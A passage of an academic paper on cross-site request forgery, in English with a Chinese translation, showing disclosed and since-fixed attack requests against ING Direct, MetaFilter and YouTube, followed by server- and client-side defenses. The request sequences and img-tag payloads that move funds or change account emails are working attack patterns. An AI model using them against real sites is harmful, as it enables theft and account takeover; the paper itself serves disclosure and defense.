>• A GET request to https://secure. ingdirect.com/myaccount/ INGDirect.html?command= goToModifyPersonalPayee&Mode= Add&from=displayEmailMoney

>(b) The attacker causes the user’s browser to enter the attacker’s information:

>• A POST request to https://secure. ingdirect.com/myaccount/ INGDirect.html with the parameters:
command=validateModifyPersonalPayee &from=displayEmailMoney&PayeeName =[PAYEE NAME]&PayeeNickname=&chk Email=on&PayeeEmail=[PAYEE EMAIL] &PayeeIsEmailToOrange=true&Payee OrangeAccount=[PAYEE ACCOUNT NUM]& YES, I WANT TO CONTINUE..x=44
            &YES, I WANT TO CONTINUE..y=25
. . . where [PAYEE NAME] is the attacker’s name, [PAYEE EMAIL] is the attacker’s email address and [PAYEE ACCOUNT NUM] is the attacker’s ING account number.
> (c) The attacker causes the user's browser 
confirm that the attacker is a valid payee:

>• A POST request to https://secure.
ingdirect.com/myaccount/ INGDirect.html with the parame- ters:
                 command=modifyPersonalPayee&from=
                 displayEmailMoney&YES, I WANT TO
                 CONTINUE..x=44 &YES, I WANT TO
                 CONTINUE..y=25

```
2.攻击者将自己添加为用户账户收款人。
(a)攻击者使用户的浏览器访问ING的“添加人员”页面：
    •一个GET请求发送到https://secure. ingdirect.com/myaccount/ INGDirect.html?command= goToModifyPersonalPayee&Mode= Add&from=displayEmailMoney
(b)攻击者使用户浏览器输入攻击者的信息：
   •一个POST请求发送到https://secure. ingdirect.com/myaccount/ INGDirect.html 带有以下参数：
           command=validateModifyPersonalPayee &from=displayEmailMoney&PayeeName =[PAYEE NAME]&PayeeNickname=&chk Email=on&PayeeEmail=[PAYEE EMAIL] &PayeeIsEmailToOrange=true&Payee OrangeAccount=[PAYEE ACCOUNT NUM]& YES, I WANT TO CONTINUE..x=44
            &YES, I WANT TO CONTINUE..y=25
            
            …其中[PAYEE NAME]是攻击者的名字，[PAYEE EMAIL]是攻击者的电子邮件地址，[PAYEE ACCOUNT NUM]是攻击者的ING帐号。
(c)攻击者使用户浏览器确认攻击者是有效的收款人账户：

•一个POST请求给 https://secure.
ingdirect.com/myaccount/ INGDirect.html 带着以下参数:

                 command=modifyPersonalPayee&from=
                 displayEmailMoney&YES, I WANT TO
                 CONTINUE..x=44 &YES, I WANT TO
                 CONTINUE..y=25

```
>3. The attacker transfers funds from the user’s account to his own account.
(a) The attacker causes the user’s browser to enter an amount of money to send to the attacker:
• A POST request to https://secure. ingdirect.com/myaccount/ INGDirect.html with the parame- ters:
command=validateEmailMoney&CNSPayID =5000&Amount=[TRANSFER AMOUNT] &Comments=[TRANSFER MESSAGE]&YES,
I WANT TO CONTINUE..x=44 &YES, I WANT TO CONTINUE..y=25&show=1&button=Send Money
. . . where [TRANSFER AMOUNT] is the amount of money to transfer from the user’s account to the attacker’s account and [TRANSFER MESSAGE] is the message to include with the transaction.
>(b) The attacker causes the user’s browser to con- firm that the money should be sent:

>• A POST request to https://secure. ingdirect.com/myaccount/ INGDirect.html with the parame- ters:
command=emailMoney&Amount= [TRANSFER AMOUNT]Comments= [TRANSFER MESSAGE]&YES, I WANT TO CONTINUE..x=44&YES, I WANT TO CONTINUE..y=25
. . . where [TRANSFER AMOUNT] and [TRANSFER MESSAGE] are the same values as 3 (a) above.
To exploit this attack, an attacker would create a page that made the above POST requests in succession using JavaScript. This would be invisible to the user.

```
3.攻击者从用户账户转移资金到自己的账户。
(a)一个POST请求发送到 https://secure. ingdirect.com/myaccount/ INGDirect.html带有以下参数
    command=validateEmailMoney&CNSPayID =5000&Amount=[TRANSFER AMOUNT] &Comments=[TRANSFER MESSAGE]&YES,
    I WANT TO CONTINUE..x=44 &YES, I WANT TO CONTINUE..y=25&show=1&button=Send Money
    
    ...其中[TRANSFER AMOUNT]是从用户帐户转移到攻击者帐户的金额，[TRANSFER MESSAGE]是要包含在交易中的消息。

(b)攻击者使用户浏览器确认钱确实被转移到自己账户：

• 一个POST请求发送到https://secure. ingdirect.com/myaccount/ INGDirect.html带有以下参数：
    command=emailMoney&Amount= [TRANSFER AMOUNT]Comments= [TRANSFER MESSAGE]&YES, I WANT TO CONTINUE..x=44&YES, I WANT TO CONTINUE..y=25
     
    … 其中[TRANSFER AMOUNT]和[TRANSFER MESSAGE]的值与上面的3（a）相同。

```

>This attack assumes the user has not added an addi- tional payee to his ING Direct checking account. The attack could likely have been modified to work without this restriction.
We verified this attack in Firefox 2.0.0.3 and Inter- net Explorer 7.0.5. We did not test this attack in other browsers. We notified ING of this vulnerability and it has since been fixed.

```
这种攻击假设用户还未他的ING Direct支票账户添加额外的收款人。如果没有这种限制，攻击很有可能已经被修改。
我们在Firefox 2.0.0.3和Internet Explorer 7.0.5试验了这种攻击。我们没有在其他浏览器测试这种攻击。我们告知了ING这种漏洞并且这种漏洞已经被修复。
```

>## 3.3 MetaFilter (metafilter.com)
>“MetaFilter is a weblog. . . that anyone can con- tribute a link or a comment to.” It currently has over 50,000 users and over 3.5 million unique visitors each month [1].
>We discovered a CSRF vulnerability in MetaFilter that allowed an attacker to take control of a user’s account.
MetaFilter has a “Lost Password” page [6] which al- lows a user to request his password. Entering a username causes MetaFilter to send an email containing the user’s current password to the email address associated with that user. This means that an attacker with the ability to change a user’s email address could have used the “Lost Pass- word” page to receive the user’s password and used that password to take control of the user’s account.
The CSRF attack we found allowed an attacker to change a user’s email address. To exploit this attack, an at- tacker would cause the user’s browser to send a request to the page that is used to update a user’s profile. This page accepts the user’s email address as an argument, which can be replaced with the attacker’s address. An exam- ple attack would be the following HTML embedded on a page:

```
<img src=" http://metafilter.com/contribute/customize_ action.cfm?user_email=[ATTACKER’S EMAIL]"/>
```
>While this will change the email address of any logged- in user, the attacker will not know which user’s account was modified. The attacker can discover this by taking ad- vantage of another MetaFilter feature, which allows users to mark other users as “contacts.” The attacker can use a CSRF similar to the above to cause a user to unknowingly add the attacker to his contact list.
We verified this attack in Firefox 2.0.0.6. It does not work in Internet Explorer due to reasons described in Ap- pendix A. We did not test this attack in other browsers. We reported this vulnerability to MetaFilter and confirmed it was fixed within two days.

```
3.3 MetaFilter（metafilter.com）

    “MetaFilter是一个博客…… 任何人都可以为添加链接或评论。"它目前每月有超过50,000名用户和350多万独立访问者[1
    
我们在MetaFilter中发现了一个允许攻击者控制用户的帐户的CSRF漏洞。
MetaFilter有一个“忘记密码”页面[6]，它允许用户请求获取他的密码。输入用户名会使MetaFilter将包含用户当前密码的电子邮件发送到与该用户关联的电子邮件地址。这意味着能够更改用户电子邮件地址的攻击者可以使用“丢失密码”页面来获取用户的密码，并使用该密码来控制用户的帐户。

我们发现的CSRF攻击允许攻击者更改用户的电子邮件地址。要利用此攻击，攻击者会使用户的浏览器向用于更新用户个人资料的页面发送请求。此页面接受用户的电子邮件地址作为参数，可以用攻击者的地址替换。示例攻击是嵌入在页面上的以下HTML：
     
     <img src=" http://metafilter.com/contribute/customize_ action.cfm?user_email=[ATTACKER’S EMAIL]"/>

虽然这会更改任何已登录用户的电子邮件地址，但攻击者无法知道修改了哪个用户的帐户。 攻击者可以通过利用另一个MetaFilter功能来发现这一点，该功能允许用户将其他用户标记为“联系人”。攻击者可以使用类似上述的CSRF使用户在不知情的情况下将攻击者添加到他的联系人列表中。
我们在Firefox 2.0.0.6中验证了此攻击。 因为存在附录A中描述的原因，所以它在Internet Explorer中不起作用。我们没有在其他浏览器中测试此攻击。 我们向MetaFilter报告了此漏洞，并确认它已在两天内修复。
```

>## 3.4 YouTube (youtube.com)
```
“YouTube is the leader in online video, and the premier destination to watch and share original videos worldwide through a Web experience” [13]. A June 2006 study found that “YouTube alone comprises approximately 20% of all HTTP traffic, or nearly 10% of all traffic on the Internet.” [14]
```

```
“YouTube是在线视频的领导者，也是通过网络体验观看和分享全球原创视频的首选目的地”[13]。 2006年6月的一项研究发现，“YouTube仅占所有HTTP流量的大约20％，占互联网上所有流量的近10％。”[14]
```

>We discovered CSRF vulnerabilities in nearly every action a user can perform on YouTube. An attacker could have added videos to a user’s “Favorites,” add himself to a user’s “Friend” or “Family” list, sent arbitrary messages on the user’s behalf, flagged videos as inappropriate, auto- matically shared a video with a user’s contacts, subscribed a user to a “channel” (a set of videos published by one per- son or group) and added videos to a user’s “QuickList” (a list of videos a user intends to watch at a later point). For example, to add a video to a user’s “Favorites,” an attacker simply needed to embed this <img> tag on any site:

```
<img src="http://youtube.com/watch_ajax? action_add_favorite_playlist=1&video_ id=[VIDEO ID]&playlist_id=&add_to_favorite= 1&show=1&button=AddvideoasFavorite"/>
```
>An attacker could have used this vulnerability to impact the popularity of videos. For example, adding a video to a sufficient number of users’ “Favorites” would have caused YouTube to show the video in its “Top Favorites” (a list of the videos “favorited” the greatest number of times). In addition to increasing a video’s popularity, an attacker could have caused users to unknowingly flag a video as inappropriate in an attempt to cause YouTube to remove it from the site.
These attacks could also have been used to violate user privacy. YouTube allows users to make videos available only to friends or family. These attacks could have al- lowed an attacker to add himself automatically to a user’s “Friend” or “Family” list, which would have given him access to any private videos uploaded by a user and re- stricted to these lists.
An attacker could have shared a video with a user’s en- tire contact list (“Friends,” “Family,” etc). “Sharing” simply means sending a link to a video with an optional mes- sage attached. This message can include a link, meaning an attacker could force a user to include a link to a site containing the attack. Users receiving the message might click on this link, allowing the attack to spread virally.
We verified these attacks in Firefox 2.0.0.6. They do not work in Internet Explorer due to reasons described in Ap- pendix A. We did not test these attacks in other browsers. We reported these vulnerabilities to YouTube and they ap- pear to have been corrected.

```
我们在用户可以在YouTube上执行的几乎所有操作中都发现了CSRF漏洞。 攻击者可以将视频添加到用户的“最喜爱收藏夹”中，将自己添加到用户的“朋友”或“家人”列表中，代表用户发送任意消息，将视频标记为不合适，自动与用户的联系人共享视频 ，将用户订阅到“频道”（由一个人或组发布的一组视频），并将视频添加到用户的“快捷列表”（用户打算稍后观看的视频列表）。 

例如，要将视频添加到用户的“最喜爱收藏夹”，攻击者只需在所有网站上嵌入此<img>标记即可：

     <img src="http://youtube.com/watch_ajax? action_add_favorite_playlist=1&video_ id=[VIDEO ID]&playlist_id=&add_to_favorite= 1&show=1&button=AddvideoasFavorite"/>
    
攻击者本可以利用此漏洞影响视频的热度。例如，将视频添加到足够数量的用户的“最喜爱收藏夹”会使YouTube在其“最热门收藏夹”中显示视频（一个视频“最喜欢”次数的列表）。除了增加视频的受欢迎程度之外，攻击者还可能导致用户在不知情的情况下将视频标记为不当，企图YouTube将其从网站中删除。
这些攻击也可能被用来侵犯用户隐私。 YouTube允许用户仅向朋友或家人拍摄视频。这些攻击可能会让攻击者自动将自己添加到用户的“朋友”或“家人”列表中，这样他就可以访问用户上传的任何私人视频并限制在这些列表中。
攻击者可以与用户的整个联系人列表（“朋友”，“家人”等）共享视频。 “共享”仅仅意味着发送附加了可选消息的视频的链接。此消息可以包含链接，这意味着攻击者可以强制用户包含指向包含攻击的站点的链接。收到该消息的用户可能会点击此链接，允许攻击以病毒传播。
我们在Firefox 2.0.0.6中验证了这些攻击。由于附录A中描述的原因，它们无法在Internet Explorer中工作。我们没有在其他浏览器中测
试这些攻击。我们向YouTube报告了这些漏洞，并且它们已经得到纠正。

```

># 4 Preventing CSRF
>We have created two tools that can protect a large number of users from CSRF attacks. The first is a server-side tool which can completely protect a potential target site from CSRF attacks. The second is a client-side tool which can protect users from certain types of CSRF attacks. Table 1 describes exactly when users are protected by these differ- ent techniques. We also recommend features that should be part of a server-side solution. These recommendations have advantages over previously proposed solutions since they do not require server state and do not break typical web browsing behavior.

```
4 防止CSRF

我们生成了两个可以保护大量用户免受CSRF攻击的工具。 第一个是服务器端工具，可以完全保护潜在的目标站点免受CSRF攻击。 第二种是客户端工具，可以保护用户免受某些类型的CSRF攻击。 表1详细描述了用户受这些不同技术保护的时间。 我们还建议应该成为服务器端解决方案一部分的功能。 这些建议优于之前已经提出的解决方案，因为它们不需要服务器状态并且不会破坏典型的Web浏览行为。
```
>## 4.1 Server-Side Protection
>Note: We assume below that an adversary cannot modify a user’s cookies associated with a target site. The same- origin policy guarantees this to be the case unless the at- tacker is an active network attacker. The solution below does not protect against active network attackers (see [17] for more details).
Recently, many frameworks have been introduced that simplify web development in a variety of languages. Ex- amples include Code Igniter [4] (PHP), Ruby on Rails [8] (Ruby), django [5] (Python), Catalyst [3] (Perl) and Struts [9] (Java). One major benefit of these frameworks is that CSRF protection can be built directly into the framework, protecting developers while freeing them from the need to implement protections on their own. CSRF protection implemented at the framework level would be subject to greater oversight and a lower chance of introducing bugs due to carelessness or a misunderstanding of CSRF.
Individual sites as well as frameworks can protect themselves from CSRF attacks by taking the following precautions:


>#### 1. Allow GET requests to only retrieve data, not modify any data on the server

    This change protects sites from CSRF attacks using <img> tags or other types of GET requests. Ad- ditionally, this recommendation follows RFC 2616 (HTTP/1.1):

    In particular, the convention has been es- tablished that the GET and HEAD meth- ods SHOULD NOT have the significance of taking an action other than retrieval. These methods ought to be considered “safe” [21].
    
>While this protection does not prevent CSRF on its own (since attackers can use POST requests), it can be combined with (2) to completely prevent CSRF vulnerabilities5 .

```
4.1服务器端保护

注意：我们在下面假设攻击者无法修改与目标站点关联的用户cookie。除非攻击者是活跃的网络攻击者，否则同源策略可以保证这种情况。下面的解决方案不能抵御活跃的网络攻击者（更多细节见[17]）。
最近，已经引入了许多框架，这些框架简化了各种语言的Web开发。例如Code Igniter [4]（PHP），Ruby on Rails [8]（Ruby），django [5]（Python），Catalyst [3]（Perl）和Struts [9]（Java）。这些框架的一个主要好处是CSRF保护可以直接构建到框架中，保护开发人员，同时使他们不需要自己实施保护。在框架层面实施的CSRF保护将受制于较大的疏忽，并且对CSRF的误解而引入错误的可能性降低低。
通过采取以下预防措施，各个站点和框架可以保护自己免受CSRF攻击：
   1.允许GET请求仅检索数据，而不是修改服务器上的任何数据
   
       此更改使用<img>标记或其他类型的GET请求保护站点免受CSRF攻击。 另外，这个建议遵循RFC 2616（HTTP / 1.1）：
       特别的，已经建立了GET和HEAD方法不应该具有采取除检索之外的行动的重要性的惯例。 这些方法应该被认为是“安全的”[21]。
       
    虽然这种保护本身并不能阻止CSRF（因为攻击者可以使用POST请求），但它可以与（2）结合使用以完全防止CSRF漏洞5。
```


>#### 2. Require all POST requests to include a pseudo- random value
>When a user visits a site, the site should generate a (cryptographically strong) pseudorandom value and set it as a cookie on the user’s machine. The site should require every form submission to include this pseudorandom value as a form value and also as a cookie value. When a POST request is sent to the site, the request should only be considered valid if the form value and the cookie value are the same. When an attacker submits a form on behalf of a user, he can only modify the values of the form. An at- tacker cannot read any data sent from the server or modify cookie values, per the same-origin policy (see Appendix B). This means that while an attacker can send any value he wants with the form, he will be unable to modify or read the value stored in the cookie. Since the cookie value and the form value must be the same, the attacker will be unable to suc- cessfully submit a form unless he is able to guess the pseudorandom value.

```
2.要求所有POST请求都包含伪随机值

当用户访问一个站点时，该站点应生成（加密强）伪随机值并将其设置为用户计算机上的一个cookie。该网站应要求每个表单提交包含这个伪随机值作为一项表单值以及一项cookie值。当POST请求发送到站点时，只有表单值和cookie值相同，则该请求被视为有效。当攻击者代表用户提交表单时，他只能修改表单的值。根据同源策略，攻击者无法读取从服务器发送的任何数据或修改cookie值（参见附录B）。这意味着虽然攻击者可以使用表单发送他想要的任何值，但他将无法修改或读取存储在cookie中的值。因为cookie值和表单值必须相同，除非攻击者能够猜测伪随机值。否则他将无法成功提交表单。
```
>#### 3. Use an pseudorandom value that is independent of a user’s account
>Pseudorandom values that are connected to a user’s account fail to prevent the “Login CSRF” attack de- scribed in [17].
This form of server-side protection has the following characteristics:
>• Lightweight. This solution requires no server-side state. The site’s only responsibility is to generate a pseudorandom value (if none currently exists) and compare two values when a POST request is made, making this form of CSRF protection computation- ally inexpensive.
>• Parallel session compatible. If a user has two dif- ferent forms open on a site, CSRF protection should not prevent him from successfully submitting both forms. Consider what would happen if the site
>table 

None                                                                    | Unprotected User  | User using our Firefox plugin | 
---                                                                         |  ---                         |  ---
Target Server with no protections                        | Not Protected        |  Not Protected
Target Server that only accepts POST requests  | Not Protected        |  Protected
Target Server that uses server-side protection    | Protected               |  Protected

![](/翻译大作业/images/table1.png)

```

Table 1: User Protection.
This table shows when users are and are not protected from CSRF attacks. Our server-side recommendations protect every user of a site. Our client-side browser plugin protects a user when the server requires POST requests to be used.
表 1：用户保护
此表显示用户何时受到CSRF攻击、未受到CSRF攻击的保护。 我们的服务器端建议可保护站点的每个用户。 当服务器需要使用POST请求时，我们的客户端浏览器插件可以保护用户。
```
>were to generate a pseudorandom value each time a form was loaded, overwriting the old pseudorandom value. A user could only successfully submit the last form he opened, since all others would contain invalid pseudorandom values. Care must be taken to ensure CSRF protection does not break tabbed browsing or browsing a site using multiple browser windows. This solution prevents this problem by set- ting a site-wide cookie and using the same cookie for all forms for a certain amount of time.
> • Authentication agnostic. This solution does not re- quire that a specific type of authentication be used. It works with sites using cookie sessions, HTTP au- thentication, SSL authentication, or IP addresses to authenticate users.

```
3.使用独立于用户帐户的伪随机值
与用户帐户关联伪随机值无法阻止[17]中描述的“登录CSRF”攻击。
这种形式的服务器端保护具有以下特征：
•轻量级。此解决方案不需要服务器端状态。站点唯一的责任是生成伪随机值（如果当前不存在）并在生成POST请求时比较两个值，使这种形式的CSRF保护计算成本低廉。
•并行会话兼容。如果用户在一个网站上有两种不同的表单，CSRF保护不应阻止他成功提交两种表单。考虑如果站点每次加载表单时都生成一个伪随机值，覆盖旧的伪随机值，会发生什么。用户只能成功提交他打开的最后一个表单，因为所有其他表单都包含无效的伪随机值。必须注意确保CSRF保护不会破坏分页式浏览或使用多个浏览器窗口浏览站点。这种解决方案通过设置站点范围的cookie并在一定时间内为所有表单使用相同的cookie来防止此问题。
•身份验证不可知。此解决方案不要求使用特定类型的身份验证。它适用于使用cookie会话，HTTP身份验证，SSL身份验证或IP地址对站点进行身份验证的站点。
```
>The use of pseudorandom values in forms has been pro- posed before, but many of the proposed implementations do not have the above characteristics. For example, Johns and Winter [24] and Schreiber [27] require server state, while Shiflett [28] breaks tabbed browsing. To our knowl- edge, previously proposed solutions have not stressed the importance of working with typical browsing behavior.
Any framework that intercepts POST requests and “wraps” commands to generate <form> tags can build the above CSRF protection into the framework transpar- ently. For example, if a framework requires a developer to call the function form open(...); to generate a <form ...> tag, the framework can be modified to automatically generate a pseudorandom value each time a form is cre- ated:

```
<form ...>
<input type="hidden" name="csrf value" value="8dcb5e56904d9b7d4bbf333afdd154ca">
```
>Additionally, the framework can handle setting asso- ciated cookie values and comparing the submitted value with the cookie value. If a framework adds this kind of CSRF protection, all users of the framework will be pro- tected from CSRF attacks. Since this kind of CSRF pro- tection is lightweight and agnostic to any authentication method the framework or developer might provide, we strongly advise that frameworks that intercept POST re- quests and provide functions to generate <form> tags im- plement this kind of CSRF protection and turn it on by default. The framework should provide developers with the ability to disable this protection if, e.g., they have im- plemented CSRF protection on their own or they do not want to require cookies.
We provide such a plugin for the Code Igniter frame- work. The plugin does not require the developer to mod- ify any existing forms and will intercept (and validate the pseudorandom values of) POST requests as well as func- tion calls that create <form> tags. The plugin also pro- vides a function that allows CSRF tokens to be added to AJAX requests, although this requires developer interven- tion (Code Igniter does not have a standard way of per- forming AJAX requests). The plugin can be downloaded from our website6 .

```
之前已经提出了在表单中使用伪随机值，但是许多之前的提议的实现没有上述特征。 例如，Johns和Winter [24]以及Schreiber [27]需要服务器状态，而Shiflett [28]打破分页浏览。 据我们所知，以前提出的解决方案并没有强调使用典型浏览行为的重要性。
任何拦截POST请求和“包装”命令以生成<form>标签的框架都可以透明地将上述CSRF保护构建到框架中。 例如，如果框架要求开发人员调用函数form.open（...）; 要生成<form ...>标记，可以修改框架以在每次创建表单时自动生成伪随机值：
    <form ...>
    <input type="hidden" name="csrf value" value="8dcb5e56904d9b7d4bbf333afdd154ca">
此外，框架可以处理设置相关的cookie值并将提交的值与cookie值进行比较。如果框架添加了这种CSRF保护，则框架的所有用户都将受到CSRF攻击的保护。由于这种CSRF保护是轻量级的，并且与框架或开发人员可能提供的任何身份验证方法无关，因此我们强烈建议拦截POST请求并提供生成<form>标记的函数的框架实现此类CSRF保护并默认打开它。该框架应该为开发人员提供禁用此保护的功能，例如，如果他们自己实现了CSRF保护，或者他们不需要cookie。
我们为Code Igniter框架提供了这样一个插件。该插件不需要开发人员修改任何现有表单，并将拦截（并验证伪随机值）POST请求以及创建<form>标记的函数调用。该插件还提供了一个允许将CSRF令牌添加到AJAX请求的功能，尽管这个功能的实现需要开发人员的干预（Code Igniter没有执行AJAX请求的标准方法）。该插件可以从我们的网站下载6。
```
>## 4.2 Client-Side Protection
>Since web browsers send the requests that allow an at- tacker to successfully perform CSRF attacks, client-side tools can be created to protect users from these attacks. One existing tool, RequestRodeo [24], works by acting as a proxy between the client and server. If RequestRodeo sees a request that it considers to be invalid, it strips authentication information from the request. While this works in many cases, it has some limitations. Specifi- cally, it will not work when client-side SSL authentica- tion is used, or when JavaScript is used to generate a part of the page (because RequestRodeo analyzes data as it passes through the proxy and before it is displayed by the browser).
We have developed a browser plugin that will protect users from certain types of CSRF attacks and overcomes the above limitations. We implemented our tool as an extension to the Firefox web browser. Users will need to download and install this extension for it to be effective against CSRF attacks.
Our extension works by intercepting every HTTP re- quest and deciding whether it should be allowed. This decision is made using the following rules. First, any re- quest that is not a POST request is allowed. Second, if the requesting site and target site fall under the same-origin policy (see Appendix B), the request is allowed. Third, if the requesting site is allowed to make a request to the target site using Adobe’s cross-domain policy (see Ap- pendix B), the request is allowed. If our extension rejects a request, the extension alerts the user that the request has been blocked using a familiar interface (the same one used by Firefox’s popup blocker) and gives the user the option of adding the site to a whitelist.
Our extension only intercepts POST requests. This means our extension will not protect a user against a CSRF attack that works using GET requests. The only way to prevent this type of attack would be to either al- low no cross-domain GET requests or to allow the user to only be logged-in to one site at a time, restrictions that users would likely find overly burdensome.
This Firefox extension is available for download on our website7 .

```
4.2 客户端保护

由于Web浏览器发送允许攻击者成功执行CSRF攻击的请求，因此可以创建客户端工具来保护用户免受这些攻击。一个现有工具RequestRodeo[24]通过充当客户端和服务器之间的代理来工作。如果RequestRodeo看到它认为无效的请求，它会从请求中删除身份验证信息。虽然这在许多情况下都有效，但它有一些局限性。特别是，当使用客户端SSL身份验证时，或者使用JavaScript生成页面的一部分时，它将无法工作（因为RequestRodeo在数据通过代理时以及在被浏览器显示之前分析数据）。
我们开发了一个可以保护用户免受某些类型的CSRF攻击的浏览器插件，我们将我们的工具开发为为Firefox Web浏览器的扩展程序。用户需要下载并安装此扩展程序才能有效抵御CSRF攻击。
我们的扩展工具通过拦截每个HTTP请求并决定是否允许它来工作。此决定使用以下规则进行。首先，允许任何不是POST请求的请求。其次，如果请求站点和目标站点属于同源策略（参见附录B），则允许该请求。第三，如果允许请求站点使用Adobe的跨域策略向目标站点发出请求（请参阅附录B），则允许该请求。如果我们的扩展程序拒绝请求，则扩展程序会使用熟悉的界面（与Firefox的弹出窗口阻止程序使用的界面相同）提醒用户该请求已被阻止，并为用户提供将站点添加到白名单的选项。
我们的扩展只拦截POST请求。这意味着我们的扩展不会保护用户免受使用GET请求的CSRF攻击。防止此类攻击的唯一方法是既不允许跨域GET请求，也不允许用户一次只登录到一个站点，用户可能会发现过于繁琐的限制。
这个Firefox扩展可以在我们的网站上下载7。
```
># 5 Related Work
>The exposure CSRF attacks have received is largely due to the work of Chris Shiflett [28] of OmniTI and Jeremiah Grossman [23] of WhiteHat Security. Burns [19] and Schreiber [27] provide comprehensive introductions to CSRF attacks, but do not describe working vulnerabil- ities. Johns and Winter [24] describe RequestRodeo, a client-side protection against CSRF attacks using an HTTP proxy. This approach has some limitations and they describe a browser plugin similar to ours as possible fu- ture work. They have expanded on this work in [25] by implementing a restricted local network which prevents CSRF attacks against local resources.
Server-side protections exist that are similar to our rec- ommendations, but the lack of standard requirements has caused unnecessary problems. As mentioned, Johns and Winter [24] and Schreiber [27] require server state, while Shiflett [28] breaks tabbed browsing. Jovanovic et al. [26] have created a method to retrofit legacy applications with CSRF protections by adding a proxy between the web server and the web application. These protections require all data be buffered and links in the application modified. They also require certain application calls to be rewritten. This solution is effective when the native application can not be rewritten, but not as effective as adding CSRF pro- tection to the application directly. This solution is aimed at administrators who want to protect applications on their servers from CSRF attacks, while our solution is aimed at web application and framework developers who want to add CSRF protection directly to their programs.

```
5 相关工作

 已获得的CSRF攻击的曝光很大程度上是由于OmniTI的Chris Shiflett [28]和WhiteHat Security的Jeremiah Grossman [23]的工作。 Burns [19]和Schreiber [27]提供了对CSRF攻击全面综合的介绍，但没有描述工作漏洞。 Johns和Winter[24]描述了RequestRodeo，这是一种使用HTTP代理防止CSRF攻击的客户端保护。这种方法有一些局限性，它们描述了一个类似于我们的浏览器插件，可能在未来实现。他们在[25]中通过实施受限制的阻止对本地资源CSRF攻击的本地网络扩展了这项工作。
存在与我们的建议类似的服务器端保护，但缺乏标准要求引起了不必要的问题。如前所述，Johns和Winter [24]以及Schreiber [27]需要服务器状态，而Shiflett [28]打破了分页式浏览。Jovanovic奇等人[26]通过在Web服务器和Web应用程序之间添加代理，创建了一种通过CSRF保护来改进遗留应用程序的方法。这些保护要求缓冲所有数据并修改应用程序中的链接。它们还需要重写某些应用程序调用。当本机应用程序无法重写时，此解决方案很有效，但不如直接向应用程序添加CSRF保护有效。该解决方案面向希望保护其服务器上的应用程序免受CSRF攻击的管理员，而我们的解决方案针对希望直接在其程序中添加CSRF保护的Web应用程序和框架开发人员。
```

> # 6 Future Work
>Given the prevalence of CSRF vulnerabilities, an auto- mated method to scan for these problems would be very useful. Bortz and Boneh [18] describe Cross-Site Tim- ing Attacks and suggest that they may be combined with CSRF attacks to further compromise user privacy.
Our client-side browser plugin is a Firefox extension that only works with Firefox. Similar plugins could be written for other browsers. Likewise, the server-side methods used by our CodeIgniter extension could be eas- ily implemented in other frameworks.
Our client-side browser plugin appears to be the first implementation of Adobe’s cross-domain policy outside of Adobe’s own Flash program. More work could be done to see if carefully adopting this policy in other contexts would increase user protection and site flexibility.

```
6 未来的工作

鉴于CSRF漏洞的普遍存在，扫描这些问题的自动方法将非常有用。 Bortz和Boneh[18]描述了跨站点攻击，并建议将它们与CSRF攻击相结合，以进一步破坏用户隐私。
我们的客户端浏览器插件是Firefox扩展程序，仅适用于Firefox。 可以为其他浏览器编写类似的插件。 同样，我们的CodeIgniter扩展使用的服务器端方法可以在其他框架中轻松实现。
我们的客户端浏览器插件似乎是Adobe自己的Flash程序之外的第一个Adobe跨域策略实现。 可以做更多的工作，看看在其他情况下仔细采用这一政策是否会增加用户保护和网站灵活性
```
># 7  Conclusion
>CSRF attacks are relatively simple to diagnose, exploit and fix. Sites can be analyzed in a matter of seconds; at- tacks can be constructed in a matter of minutes. The most plausible explanation for the prevalence of these attacks is that web developers are unaware of the problem or think (mistakenly) that defenses against the better-known cross- site scripting attacks also protect against CSRF attacks. We hope the attacks we have presented show the danger of CSRF attacks and help web developers to give these at- tacks the attention they deserve. Once web developers are made aware of CSRF attacks, they can use tools like the ones we have created to protect themselves.
We suggest the creators of frameworks add CSRF pro- tection to their frameworks, thereby protecting any site built on top of such a framework. Adding CSRF protec- tion at the framework level frees developers from dupli- cating code and even the need to understand CSRF at- tacks in detail (although understanding these attacks is recommended). Until every site is protected from CSRF attacks, users can take steps to protect themselves using our browser plugin for Firefox. Similar plugins could be written for other browsers.
The root cause of CSRF and similar vulnerabilities probably lies in the complexity of today’s Web protocols, and the gradual evolution of the Web from a data presenta- tion facility to a platform for interactive services. As more capabilities are added to browser clients, and as more sites involve sophisticated programming and client-server in- teractive services, CSRF and related attacks will become more prevalent unless defenses are adopted. As the com- plexity of Web technologies continue to increase, we can expect further new categories of attacks to emerge.

```
7 结论

CSRF攻击的诊断、利用和修复相对简单。网站可以在几秒钟内被分析分析;可以在几分钟内被攻击。对这些攻击普遍存在的最合理的解释是Web开发人员没有意识到这个问题，或者（错误地）认为针对更知名的跨站点脚本攻击的防御也可以抵御CSRF攻击。我们希望我们提出的攻击显示出CSRF攻击的危险，并帮助Web开发人员给予他们应有的关注。一旦Web开发人员意识到CSRF攻击，他们就可以使用像我们创建的工具来保护自己。
我们建议框架的创建者将CSRF保护添加到他们的框架中，从而保护构建在这种框架之上的任何站点。在框架级别添加CSRF保护可以使开发人员免于重复编写代码，甚至避免详细了解CSRF攻击（尽管建议了解这些攻击）。在每个站点都受到CSRF攻击保护之前，用户可以使用我们的Firefox浏览器插件来保护自己。也可以为其他浏览器编写类似的插件。
CSRF和类似漏洞的根本原因可能在于当今Web协议的复杂性，以及Web从数据呈现设施到交互式服务平台的逐步演变。随着更多功能被添加到浏览器客户端，并且随着更多站点涉及复杂的编程和客户端-服务器交互式服务，除非采用防御措施，否则CSRF和相关攻击将变得更加普遍。随着Web技术的复杂性不断增加，我们可以预期会出现更多新类型的攻击
```
># References
>[1] About Metafilter. http://www.metafilter. com/about.mefi.

>[2] Allowing cross-domain data loading.
http://livedocs.adobe.com/flash/ 9.0/main/wwhelp/wwhimpl/common/ html/wwhelp.htm?context=LiveDocs_ Parts&file=00001085.html.

>[3] Catalyst. http://www. catalystframework.org/.
2007/NXTcommEllacoyaMediaAlert.pdf, Jun 2006.

>[4] Code Igniter. com/.

>[5] django. com/.
  http://www.codeigniter.
http://www.djangoproject.

>[6] Metafilter: Lost Password? http://www. metafilter.com/login/lostpassword. mefi.

>[7] Privacy in Internet Explorer 6.
//msdn2.microsoft.com/en-us/ library/ms537343.aspx.
http:

>[8] Ruby on Rails. http://www.rubyonrails. org.

>[9] Struts. http://struts.apache.org/.

>[10] The New York Times: Media Kit 2007.
http://www.nytimes.whsites.net/ mediakit/pages/d_aud_target.html.

>[11] The Same-Origin Policy. http://livedocs. adobe.com/flash/9.0/main/wwhelp/ wwhimpl/common/html/wwhelp.htm.

>[12] Web Security Threat Classification. http:// www.webappsec.org/projects/threat/.

